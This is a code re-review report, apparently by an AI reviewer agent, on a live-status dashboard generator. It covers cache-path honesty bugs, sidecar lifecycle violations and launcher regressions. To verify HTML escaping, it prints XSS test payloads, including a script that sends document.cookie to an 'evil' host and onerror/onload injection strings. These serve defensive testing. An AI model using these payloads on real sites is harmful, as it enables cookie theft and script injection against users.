# Code Review (RE-REVIEW after remediation) — CHANGE-0127 / spec-live-status-dashboard

```yaml
review:
  scope: git diff origin/main...HEAD (feat/live-status-dashboard @ b53c1a2, 13 commits, 25 files); remediation delta git diff 23e4339..b53c1a2
  spec: docs/specs/SPEC-0114-spec-live-status-dashboard.md (12 Spec-AC, 34-row Test Plan)
  spec_compliance:
    verdict: fail
    ac_walk:
      - { ac: Spec-AC-01, call: compliant,
          citation: "TEST-001/002/003/028 green in my own wrapper run; real-repo run wrote both outputs, exit 0" }
      - { ac: Spec-AC-02, call: non-compliant,
          citation: "clause added by b53c1a2 — 'a malformed FILE or a record with no timestamp SHALL be named in notes never silently absorbed into a zero' — is false on every CACHED run (the default). Reproduced: generate-live-status.mjs:150-160 caches a failed/malformed parse as {records: []}; run 2+ report notes: [] with the file still absorbed into a 0. See BLOCKING-A" }
      - { ac: Spec-AC-03, call: compliant,
          citation: "my real-corpus warm run: files_total 761, files_read 0, files_skipped_unchanged 761; TEST-007/008 green" }
      - { ac: Spec-AC-04, call: compliant,
          citation: "TEST-009/010 green" }
      - { ac: Spec-AC-05, call: compliant,
          citation: "my own probe with CLAUDE_CONFIG_DIR/CODEX_HOME/GEMINI_HOME exported at the REAL ~/.claude, ~/.codex, ~/.gemini plus --home <empty>: all three ABSENT, scan.files_total 0, roots under the fixture. Whole suite re-run under that hostile env: 31 PASS, rc 0. generate-live-status.mjs:326-334; TEST-032 green. Maintenance hazard NNB-3 named separately" }
      - { ac: Spec-AC-06, call: compliant,
          citation: "TEST-011/012/013/014 green" }
      - { ac: Spec-AC-07, call: compliant,
          citation: "TEST-015 green" }
      - { ac: Spec-AC-08, call: compliant,
          citation: "TEST-016/017 green" }
      - { ac: Spec-AC-09, call: compliant,
          citation: "my own fresh scratch repo, no docs/ai/ at all, instrumented AAI_LIVE_OPENER: run 1 logged `EXISTS .../docs/ai/live-status.html size=4385`. aai-live.sh:47-57, aai-live.ps1:38-47; TEST-031 green. NNB-1/NNB-2 concern other launcher paths, not this clause" }
      - { ac: Spec-AC-10, call: compliant,
          citation: "my own hostile fixtures (element breakout, attribute breakout, <img onerror>, <svg onload>, tap-spool payload, hooks payload, __proto__ key): 0 matches for <script / <img / <svg / src=http in the page; no double-escaping; no prototype pollution. generate-live-status.mjs:84 naEsc + :463; TEST-030 green" }
      - { ac: Spec-AC-11, call: compliant,
          citation: "real-repo generator run then `git status --porcelain` = 0 lines, repeated after two full suite runs; TEST-019 green" }
      - { ac: Spec-AC-12, call: compliant,
          citation: "10/10 scope paths appear exactly once in PROFILES.yaml; exactly one `aai-live-status:` suite-map row; test-aai-hygiene-pack.sh and test-ps1-quality.sh green" }
  code_quality:
    verdict: fail
    findings:
      - { rank: BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 158,
          issue: "The remediation's honesty notes are produced inside parse(), but a failed/malformed parse is then CACHED as a successful empty parse (`cache[key] = {mtimeMs, size, records: []}`). Every subsequent run is a cache HIT, so the note is never re-emitted while the file is still silently absorbed into a 0. The pinning test (TEST-033) only ever exercises the cold-cache path, yet its claim ('usage stays honest 0 not a silent fabrication') and the new Spec-AC-02 clause ('never silently absorbed into a zero') are universals.",
          failure_scenario: "Reproduced three ways, default flags (cache ON), same fixture home each time. (a) chmod 000 session file: run 1 -> notes ['claude-code: file read failed, skipped ...: EACCES'], run 2 and run 3 -> notes: [], usage_today 0, files_skipped_unchanged 1. (b) gemini logs.json containing non-JSON: run 1 -> 'gemini-cli: malformed file skipped ...', run 2 -> notes: []. (c) claude .jsonl with a malformed line: run 1 -> 1 note, run 2 -> 0 notes. Under --watch (the headline mode) this is the steady state: the operator sees the named degradation for exactly ONE tick out of N, then a permanently clean-looking under-report — the precise failure mode the fix and the AC clause claim to have removed." }
      - { rank: BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 104,
          issue: "`.aai/cache/live-status-index.json` is a NEW gitignored whole-file runtime sidecar with a hand-rolled lifecycle — loadCache() (bare try/catch -> {}) and saveCache() (bare fs.writeFileSync, no tmp+rename, no GC) — instead of the mandated `.aai/scripts/lib/runtime-file.mjs` primitives (loadOrDegrade / atomicWrite / reapAsides). SKILL_CODE_REVIEW Verdict 2 makes this categorically BLOCKING, and runtime-file.mjs's own header states the convention pin verbatim ('any NEW gitignored runtime sidecar MUST use these primitives ... A bespoke re-implementation is a code-review BLOCKING finding'). Not covered by recorded NB-1, which is about pruning and payload size, not the load/write lifecycle.",
          failure_scenario: "Class A (lost update) reproduced: two generator processes over different homes sharing one --cache path, run concurrently -> the surviving cache contains only ONE process's entries; the other's parse work is silently discarded. Class E (torn write) reproduced: the 19 MB cache is rewritten whole every run (18.9 MB measured, real corpus) with a single non-atomic writeFileSync; truncating it mid-file leaves an unparseable sidecar that loadCache() swallows into `{}` (class B silent-empty). `--watch` makes concurrent generator processes the normal case (warm-up + loop, or a second terminal). Demonstrated harm is bounded to a self-healing cold re-parse, so if the operator judges a derived cache outside the pin's intent that is a waiver to record in decisions.jsonl — it is not a call the reviewer may soften." }
      - { rank: NON-BLOCKING, file: .aai/scripts/aai-live.sh, line: 54,
          issue: "The BLOCKING-2 fix dropped --data-only from the warm-up unconditionally, so the warm-up now writes docs/ai/live-status.html even when the invocation explicitly asked for --data-only. `.aai/scripts/aai-live.ps1:44` is the identical twin (`& node $Gen | Out-Null`, with only the Start-Process gated on $DataOnly). This is a behavior REGRESSION introduced by the remediation.",
          failure_scenario: "Reproduced side by side: `aai-live.sh --watch --data-only` on HEAD leaves {live-status-data.json, live-status.html} in a scratch repo; the same command on the pre-remediation tree (23e4339) leaves only live-status-data.json. A headless/CI or server operator uses --data-only precisely to avoid materializing the page; the launcher writes it anyway, from the default (real-home) configuration. Fix: forward the flag — gate the warm-up with is_data_only / $DataOnly, or pass the invocation's own args through." }
      - { rank: NON-BLOCKING, file: .aai/scripts/aai-live.sh, line: 54,
          issue: "The warm-up runs `node \"$GEN\"` with NO arguments while the opener path is hardcoded to docs/ai/live-status.html — so under --watch the page that is OPENED is the warm-up snapshot at the default path, not the page the watch loop keeps rewriting. Same in aai-live.ps1:44 + :34.",
          failure_scenario: "Reproduced: `aai-live.sh --watch --interval 1 --output <repo>/custom/page.html` -> opener opens docs/ai/live-status.html (Generated 10:19:53Z, never rewritten) while the loop writes custom/page.html (Generated 10:19:56Z and advancing). The browser shows a page whose <meta refresh> ticks forever against a file that is frozen at t0 — a page that LOOKS live and is permanently stale. Pre-remediation the same invocation produced a visible file-not-found; the fix converted a loud error into a silent one. Same class for --home/--interval/--cache, which the warm-up also ignores. Fix: derive the opener target from the resolved --output and pass the invocation's args (minus --watch) to the warm-up." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 39,
          issue: "HARNESS_ENV_OVERRIDES is a hardcoded literal in the generator that must be kept in sync by hand with each parser's roots(). registry.mjs:5-6 states the opposite contract — 'adding a harness means adding one module + one row below, nothing else in generate-live-status.mjs changes' — and no test enforces the sync. The BLOCKING-3 fix therefore closed the hole for exactly the three shipped parsers.",
          failure_scenario: "A fourth parser that honors, say, CURSOR_HOME lands per the documented registry contract (one module + one registry row). --home silently stops isolating that harness: on any machine exporting CURSOR_HOME, an empty fixture home reads the real corpus again — BLOCKING-3 verbatim, with a green suite. Fix: let each registry entry declare `envOverrides: ['CURSOR_HOME']` and have buildModel derive the strip list from PARSERS; add a registry-contract assertion." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 73,
          issue: "The new Spec-AC-10 clause states foreign data is escaped 'so a hostile harness payload never renders a live script or breaks out of its attribute' — a universal — but esc() escapes & < > \" and NOT the apostrophe, so it cannot deliver the attribute half for a single-quoted attribute. No such interpolation site exists today (I checked every `${` in renderHtml), so the AC holds as of this commit; the guarantee is structural only by accident.",
          failure_scenario: "My hostile fixture put `' onmouseover='alert(1)' x='` in window_minutes; it renders with the apostrophes intact (inert in the element context it happens to sit in). The first contributor who writes `<td class='${esc(x)}'>` or a style='' attribute re-opens BLOCKING-1 with a green TEST-030, which pins only the double-quote breakout. Fix: add .replace(/'/g, '&#39;') to esc() (one token) so the AC's universal is true by construction." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 339,
          issue: "--no-cache disables the cache on READ but not on WRITE: `cache = {}` is still populated by scanHarness and still passed to saveCache(cacheAbs, cache) at :416, so the flag clobbers the on-disk cache file.",
          failure_scenario: "Reproduced: a cache file containing the sentinel `SENTINEL-DO-NOT-CLOBBER`, then `--no-cache` -> the file is overwritten with a fresh 336-byte index. An operator who reaches for --no-cache to reproduce a bug without disturbing state destroys the artifact they were about to inspect; a --no-cache run against a fixture home also overwrites a full-corpus cache with a one-file one, making the next real run cold. Fix: skip saveCache when args.noCache." }
  cannot_verify:
    - { claim: "The .ps1 twins behave correctly at runtime on Windows — specifically that the BLOCKING-2 fix (`& node $Gen | Out-Null` before Start-Process) actually produces the file Start-Process opens, and that NNB-1/NNB-2 reproduce there as they do in bash.",
        closes_with: "A Windows CI job or a manual pwsh run capturing the twin end-to-end. TEST-023 is parse + PSScriptAnalyzer only; TEST-031 exercises the bash twin exclusively. Spec RR-2 already accepts this." }
    - { claim: "The real Claude Code statusline stdin payload carries rate_limits.five_hour/seven_day in the shape the tap branch expects.",
        closes_with: "One live statusLine install capturing a real payload. Spec RR-1 accepts this; recorded NB-4 narrows the promised SKIP fallback." }
    - { claim: "The session-quotas branch renders REAL Codex rate limits correctly — every exercise of it, mine included, is synthetic.",
        closes_with: "A run against a Codex session captured while the account is quota-limited, with payload.rate_limits.primary present." }
    - { claim: "That naEsc() is now the ONLY unescaped-foreign-data hole. I read every `${` in renderHtml and probed the codex/claude/gemini/tap/hooks paths with hostile fixtures; I did not mutation-test every field of every record shape.",
        closes_with: "A corpus-sweep or mutation harness that injects a marker into every string field of every parser's record shape and asserts zero live tags in the page." }
    - { claim: "Long-horizon behavior of the never-pruned 19 MB cache on a real machine over weeks (recorded NB-1).",
        closes_with: "A size sample from a long-running install, or the NB-1 remediation making the question moot." }
    - { claim: "The hooks overlay merges cleanly into a real .claude/settings.json and the Stop/Notification hooks fire.",
        closes_with: "An install-then-observe run; no test merges the overlay into a real settings file." }
    - { claim: "Upstream harness on-disk formats stay as observed (spec RR-3).",
        closes_with: "Nothing in this repo; the registry localizes the blast radius, which is the accepted mitigation." }
  process:
    verdict: pass-with-notes
  overall: fail
```

## Scope, method, and what I re-verified by execution

- Preflight: `git branch --show-current` = `feat/live-status-dashboard`; `git status --porcelain` empty before and after every probe (checked again at the end — 0 lines). `docs/ai/STATE.yaml:303` has `worktree.user_decision: worktree`, so the skill's worktree policy selects `git diff <base>...HEAD`; `inline_review_scope` is not consulted. Review scope: `origin/main...HEAD` @ b53c1a2, with the remediation delta `23e4339..b53c1a2` (10 files, +630/-24) read separately.
- Read first: the prior review report (094617Z), both validation rounds (091200Z FAIL, 093456Z PASS), the frozen spec, the registry contract, and `.aai/scripts/lib/runtime-file.mjs`.
- I did **not** re-run the committed tests as my evidence for the three prior BLOCKING findings. I built my own hostile fixtures in a scratch tree and reproduced each one from scratch; the committed suite was run afterwards, only as a regression net.
- Suites run by me through the wrapper, all rc 0: `test-aai-live-status.sh` (31 `PASS: TEST-*`), `test-aai-hygiene-pack.sh` (30 PASS), `test-ps1-quality.sh` (4 PASS), `test-aai-layer-profiles.sh`. Two consecutive full runs of the live-status suite (determinism) both rc 0, working tree clean after both.
- `check-test-registration.mjs tests/skills` rc 0; `aai-reap-tests.sh` reaped nothing; `spec-lint.mjs --path ... --strategy hybrid` LINT PASS, 0 findings; `docs-audit.mjs --gate spec-live-status-dashboard` GATE PASS.
- RED evidence for the five new tests exists and is genuine (`docs/ai/tdd/red-20260808T095804Z-test_030..034*.log`, each `RED_CLASS: product_red`, each failing on the pre-fix behavior with the right message — e.g. TEST-030 `found 2` live script tags, TEST-031 `MISSING .../live-status.html`, TEST-032 `got available=true`). `docs/ai/tdd/**` is gitignored, so these are local-only evidence, as the repo intends.

## Verification of the three prior BLOCKING findings — all three are dead

### BLOCKING-1 (unescaped rate_limits) — DEAD

My own fixture, not TEST-030's: a Codex `rollout-*.jsonl` whose `payload.rate_limits.primary` carries an element-context breakout in `used_percent` (`</p><script>fetch('http://evil/'+document.cookie)</script><p>`), a single-quote attribute breakout in `window_minutes` (`' onmouseover='alert(1)' x='`), and a double-quote breakout plus `<img src=x onerror>` / `<svg/onload>` plus pre-escaped entities in `resets_at`.

```
<script 0   <img 0   <svg 0   src=http 0
```

Rendered line 41: everything escaped, `&lt;/p&gt;&lt;script&gt;…`, `&quot;&gt;&lt;img src=x onerror=alert(1)&gt;`. Second fixture through the **tap** path (`spool/statusline.jsonl` with a `</table><script>` in `used_percent`, a `<script src="http://evil/x.js">` in `resets_at`, a `__proto__` key) and the **hooks** path (hostile `session_id` and `hook_event_name`): also 0 live tags, and `({}).polluted === undefined` (JSON.parse does not pollute).

No double-escaping and no corruption of legitimate values, checked separately:
- `used_percent: 0` renders `used 0%` (not N/A) — na()'s null/undefined semantics preserved exactly by naEsc.
- `used_percent: null` / missing fields render `N/A%`, `N/Am`, `N/A`.
- `resets_at: "2026-08-08T14:00:00Z"` renders verbatim.
- A value containing the literal text `&amp;&lt;already&gt;` renders `&amp;amp;&amp;lt;already&amp;gt;` — one escaping pass, displays as the original text.
- The data JSON keeps the raw unescaped values (`"project": "A & B <proj>"`), so the HTML escaping did not leak into the machine-readable output.

### BLOCKING-2 (--watch opens a nonexistent page) — DEAD

Fresh scratch repo containing only `.aai/scripts/{aai-live.sh,generate-live-status.mjs,live-parsers/*}` — no `docs/` directory at all — with an instrumented `AAI_LIVE_OPENER` that records existence:

```
EXISTS /…/repo/docs/ai/live-status.html size=4385
```

First run, first open. Warm-up cost is not pathological: cold full generate over the real 761-file corpus is 1.34 s vs 1.32 s for the old `--data-only` warm-up (+20 ms — the delta is renderHtml + one 18 KB write); the subsequent `exec`'d watch process runs warm at 0.10 s because the warm-up populated the cache. First paint went from a browser error page to a real page. Two adjacent launcher behaviors did regress — NNB-1 and NNB-2 below.

### BLOCKING-3 (--home does not isolate) — DEAD

```
$ CLAUDE_CONFIG_DIR=$HOME/.claude CODEX_HOME=$HOME/.codex GEMINI_HOME=$HOME/.gemini \
    node generate-live-status.mjs --home <empty fixture> --no-cache
claude-code available:false root:<fixture>/.claude/projects
codex       available:false root:<fixture>/.codex/sessions
gemini-cli  available:false root:<fixture>/.gemini/tmp
files_total 0   degraded 3   live_sessions 0
```

The three real corpora are untouched. I then re-ran the **entire** live-status suite with those three variables exported at the real paths: 31 `PASS: TEST-*`, rc 0 — the suite header's claim that the real `~/.claude`, `~/.codex`, `~/.gemini` are never touched now holds on this machine, which was the substance of the finding.

And the inverse, which the dispatch asked me to check explicitly: **`CLAUDE_CONFIG_DIR` is still honored in normal operation.** With no `--home`, `CLAUDE_CONFIG_DIR=<alt dir>` yields `root: <alt>/projects, available: true, sessions: 1, usage_today: 10`; `CODEX_HOME=<nonexistent>` correctly reports codex ABSENT at that path. The strip is scoped to the `if (homeOverride)` branch (`generate-live-status.mjs:328-334`) — legitimate env usage is unaffected.

## BLOCKING findings

### BLOCKING-A — the honesty notes are one-shot: every cached run silently absorbs the file into a 0 again

`.aai/scripts/generate-live-status.mjs:150-160` (cache), `live-parsers/claude-code.mjs:59-65`, `codex.mjs:66-71`, `gemini-cli.mjs:38-43` (note producers).

The remediation pushes the note from inside `parse()`. `scanHarness` then stores the result — including the empty result of a *failed* parse — as a normal cache entry:

```js
fileRecords = [...entry.parse(file, parseCtx)];
cache[key] = { mtimeMs: file.mtimeMs, size: file.size, records: fileRecords };
```

An unreadable file's `{mtimeMs, size}` are unchanged, so every later run takes the cache-hit branch, never calls `parse()`, and emits no note — while still contributing nothing to the totals. Reproduced with default flags (cache on), same fixture home:

| run | fixture | notes | usage_today | files_skipped_unchanged |
|-----|---------|-------|-------------|--------------------------|
| 1 | chmod 000 `.claude/…/s.jsonl` | `["claude-code: file read failed, skipped …: EACCES"]` | 0 | 0 |
| 2 | same | `[]` | 0 | 1 |
| 3 | same | `[]` | 0 | 1 |
| 1 | non-JSON `.gemini/tmp/proj/logs.json` | `["gemini-cli: malformed file skipped …"]` | — | 0 |
| 2 | same | `[]` | — | 1 |
| 1 | malformed LINE in a `.claude` jsonl | 1 note | 0 | 0 |
| 2 | same | 0 notes | 0 | 1 |

Why this is BLOCKING rather than a re-litigation of recorded NB-2:

- b53c1a2 **added a new Spec-AC-02 clause** — "a malformed FILE or a record with no timestamp SHALL be named in notes never silently absorbed into a zero" — and marked the row `done`. The clause is a universal; it is false on the default path. Certifying it would mean certifying an untrue AC.
- `SKILL_CODE_REVIEW.prompt.md` Verdict 2: "A test whose NAME claims a universal negative … while asserting only a subset of paths is likewise BLOCKING — rename it or prove the negative." TEST-033 ("unreadable session file named in notes[], usage stays honest 0 not a silent fabrication") asserts only the cold-cache path — `run_gen` uses a fresh per-fixture `--cache` file, so the warm path is never reached by any test in the suite.
- Under `--watch`, the headline mode, this is the steady state: one honest tick, then indefinitely many dishonest ones. The HTML never renders `notes` at all (recorded NB-3), so the JSON is the only surface where the truth ever appeared.

TEST-034's counterpart claim ("never a silent fabricated 0" for ts-less records) I verified DOES survive the cache — that note is pushed in `buildModel`'s accumulation loop, which runs over cached records too (run 1: 1 note; run 2 with `files_skipped_unchanged: 1`: still 1 note). Only the parse-time family is affected.

Two acceptable closures, both cheap: (a) do not cache a failed parse (and/or re-emit the note on a cache hit whose stored record set came from a failure) — the honest fix; or (b) narrow the AC clause and the test claim to the cold path and record the cached-path gap as a named NON-BLOCKING with a disposition. What is not acceptable is shipping the universal as `done`.

### BLOCKING-B — the new cache sidecar hand-rolls its lifecycle instead of runtime-file.mjs

`.aai/scripts/generate-live-status.mjs:104-121` (`loadCache` / `saveCache`), sidecar `.aai/cache/live-status-index.json` (gitignored via the pre-existing `.aai/cache/` rule).

`SKILL_CODE_REVIEW.prompt.md` Verdict 2, SIDECAR LIFECYCLE: "a NEW gitignored runtime sidecar that hand-rolls load/write/stale/claim/GC instead of `.aai/scripts/lib/runtime-file.mjs` is a BLOCKING finding (reopens bug classes A-F)." `runtime-file.mjs:23-27` states the same pin from the other side ("CONVENTION PIN … A bespoke re-implementation is a code-review BLOCKING finding"), and the sidecar here is exactly the whole-file read-all/write-all shape those primitives cover.

What is re-derived, and the classes it reopens:

- `loadCache`: bare `try { JSON.parse(readFileSync(...)) } catch { return {} }` — **class B**, a damaged sidecar read as "nothing there", the case `loadOrDegrade`'s three-way `absent | corrupt | ok` exists to prevent. Reproduced: truncating the cache to 60 % yields a silent full re-parse, no note, no degraded entry.
- `saveCache`: bare `fs.writeFileSync` of an 18.9 MB payload, no tmp+rename — **class E** (torn write). `atomicWrite` exists for this.
- No claim/lease around load→mutate→write — **class A** (cross-process read-modify-write). Reproduced: two generator processes over different homes sharing one `--cache` path, run concurrently → the surviving cache holds only one process's entries; the other's work is silently discarded. `--watch` makes concurrent generator processes ordinary (a watch loop plus any one-shot run).
- No GC — **class D**. Already observed as recorded NB-1; I am not re-litigating NB-1's disposition, and the natural remedy for this finding (porting the two call sites to `loadOrDegrade` + `atomicWrite`, with a rebuild-from-discovered-set) is the same edit NB-1's `remediate-in-tree` disposition already owes.

Honest bound on the harm: every consequence I could demonstrate is self-healing — a corrupt, torn, or lost-update cache costs one cold re-parse (1.34 s on the real corpus), not wrong output. I verified the totals are correct after a corrupt-cache run. The pin is nonetheless categorical in the skill, and its whole point is that it is not argued down case by case; if the operator judges a purely derived cache outside its intent, that is a waiver to record in `docs/ai/decisions.jsonl`, not something a reviewer may quietly soften.

## NON-BLOCKING findings and recommended dispositions (H6)

These are NEW findings from this pass. The ORCHESTRATOR records the disposition; as a read-only reviewer I file neither a decision nor a ref.

| # | Finding (file:line) | Recommended disposition |
|---|---|---|
| NNB-1 | `--watch --data-only` now writes the HTML the flag suppresses — regression from the BLOCKING-2 fix; `aai-live.sh:54`, `aai-live.ps1:44` | remediate-in-tree (gate the warm-up on `is_data_only` / `$DataOnly`) |
| NNB-2 | Warm-up takes no args and the opener path is hardcoded, so `--watch --output <path>` opens a frozen default-path snapshot that meta-refreshes forever on stale content — `aai-live.sh:54,56`, `aai-live.ps1:34,44` | remediate-in-tree (derive the opener target from `--output`; pass the invocation's args minus `--watch` to the warm-up) |
| NNB-3 | `HARNESS_ENV_OVERRIDES` hardcoded in the generator contradicts the registry contract's "one module + one row" claim and re-opens BLOCKING-3 for a future 4th parser, unenforced — `generate-live-status.mjs:39`, `live-parsers/registry.mjs:5` | remediate-in-tree (per-entry `envOverrides`, derived at buildModel) |
| NNB-4 | `esc()` does not escape the apostrophe, so Spec-AC-10's "never breaks out of its attribute" universal is true only because no single-quoted attribute site exists today — `generate-live-status.mjs:73` | remediate-in-tree (one extra `.replace(/'/g, '&#39;')`) |
| NNB-5 | `--no-cache` still writes and thereby clobbers the cache file — `generate-live-status.mjs:339,416` | remediate-in-tree (skip `saveCache` when `args.noCache`) |

The prior report's twelve NON-BLOCKING rows (NB-1 … NB-12) stand as recorded, with two now closed by b53c1a2 (NB-2 and NB-7, subject to BLOCKING-A above for the cached path). **None of the remaining ten has an artifact yet**: `docs/ai/decisions.jsonl` contains zero entries mentioning CHANGE-0127 or live-status, and no follow-up ref names them. Under the H6 policy that debt must be discharged before closeout, independently of the two BLOCKING findings here.

## INFO (never gates)

- The remediation added a second unbounded producer to the `notes` array that recorded NB-3 already flags as uncapped. Measured: a 20 000-record ts-less corpus produces 20 000 identical note strings and a 1.97 MB `live-status-data.json` (vs ~26 KB on the real corpus), none of it surfaced in the 8 KB HTML. The real corpus is unaffected (`notes: 0` over 761 files), so this is a note for whoever implements NB-3's cap — it must cover the new producer too.
- Commit message evidence claim: "Full suite (33/33)". The suite emits **31** `PASS: TEST-*` (TEST-001..020 + 024..034); TEST-021/022/023 live in sibling suites, for 34 spec rows total. Same class as validator O4's "29/29" on the previous commit — a recurring cosmetic inaccuracy in an evidence claim.
- Spec Test Plan prose: "TEST-028 … TEST-029 …; TEST-030, TEST-031 and TEST-032 …; TEST-033 and TEST-034 … — each of these **six** has its own stored RED" enumerates seven tests.
- `tests/skills/test-aai-layer-profiles.sh` has no executable bit, so `aai-run-tests.sh <path>` exits 127 (the wrapper `exec`s the script). Pre-existing and out of this scope (last touched by 55e167d on main); it passes under the wrapper when invoked as `aai-run-tests.sh bash <path>`, and TEST-021 is green either way. Worth a one-line `chmod +x` somewhere, not here.
- Adversarial probes that PASSED and are worth recording: JSON `__proto__` keys in a spool payload do not pollute `Object.prototype`; a corrupt cache produces correct totals; the tap and hooks render paths escape every foreign field; `state` badges are drawn from a fixed vocabulary and cannot be driven by a hostile `hook_event_name`; the `--home` strip does not disturb `AAI_LIVE_SPOOL_DIR` or any non-harness env var.
- Warm-up performance, for the record: cold 1.34 s / warm 0.10 s over 761 files; the BLOCKING-2 fix costs +20 ms on the first paint.

## Anti-gaming: coaching attempt recorded

The ANTI-GAMING CONTRACT binds the dispatching orchestrator not to "characterize expected findings, pre-rate severity, or scope-exclude areas for the reviewer". This dispatch did two of the three: it enumerated the three findings to verify with specific probes prescribed ("try both element and attribute context breakouts", "check!"), and it scope-excluded the prior report's twelve NON-BLOCKING rows from re-litigation. Recorded as required. Mitigating: it also correctly instructed me to build my own fixtures rather than re-run the committed tests, and to bring fresh eyes — which I did. I reviewed the full scope regardless, including surfaces the dispatch named none of: the cache sidecar lifecycle, the cached-run behavior of the new notes, the launcher's argument handling, `--no-cache`, the registry-contract coupling, and the escaping helper's apostrophe gap. Both BLOCKING findings and four of the five NON-BLOCKING findings are outside the dispatch's list, which is the point of the rule.

The dispatch did not ask me to fix anything; I wrote only this report.

## Process verdict — pass with notes

Strong: the remediation is disciplined work. Each of the three BLOCKING findings got a stored `product_red` against the pre-fix tree with the right failure message, a minimal fix, and a spec Test Plan row with its AC mapping; the AC text was *widened* to name the new observable rather than leaving the fix untraceable; the prior review report was staged with the remediation commit per the report-staging rule; the fixes are one-liners that did not sprawl; the `--home` strip is correctly scoped so normal `CLAUDE_CONFIG_DIR` operation still works, which is the easy thing to get wrong. Maker != checker held again.

Notes:
- The coaching attempt above.
- **The prior review's verdict was never written to STATE.** `docs/ai/STATE.yaml:313` still reads `code_review.status: not_run` with `report_paths: []`, although a `fail` verdict and a report exist from 094617Z. Orchestrator-owned, and the same block still carries `base_ref: feat/live-status-dashboard` (the branch under review — an empty diff if taken literally; should be `origin/main`).
- The two stale worktree fields the prior review flagged are unchanged: `worktree.branch: feat/core-prompt-diet` (STATE.yaml:305) and an `inline_review_scope` listing that ride's files (:307).
- Ten of twelve recorded NON-BLOCKING rows still have no decision entry and no follow-up ref (H6).
- Recurring evidence-claim inflation in commit messages ("29/29", now "33/33", and "six" for seven tests). Small, but these are the numbers a future auditor trusts.
- Structural observation, offered rather than charged: both BLOCKING findings this round are *cache-path* behaviors, and the previous round's were *first-run* and *hostile-env* behaviors. Every test in the suite runs against a fresh fixture with a fresh cache. A "second run / warm cache" seam alongside SEAM 1-5 would have caught BLOCKING-A at freeze, exactly as a "hostile input" seam would have caught BLOCKING-1 last round.

## Next steps

1. Close BLOCKING-A: either stop caching a failed parse (re-emitting the note while the condition persists), or narrow the Spec-AC-02 clause and the TEST-033 claim to what is actually proven and record the cached-path gap with a disposition. RED first, per the pattern this ride has already established.
2. Close BLOCKING-B: port `loadCache`/`saveCache` to `runtime-file.mjs`'s `loadOrDegrade` + `atomicWrite`, folding in NB-1's rebuild-from-discovered-set — or record an explicit waiver in `docs/ai/decisions.jsonl` if the operator judges a derived cache outside the convention pin.
3. Orchestrator records a disposition for NNB-1 … NNB-5 and for the ten still-unrecorded prior NB rows (H6).
4. Orchestrator refreshes STATE: `code_review.status`, `report_paths`, `base_ref: origin/main`, and the two stale `worktree` fields.
5. Re-review once the suites are green again; `overall` cannot flip to pass while either BLOCKING stands.
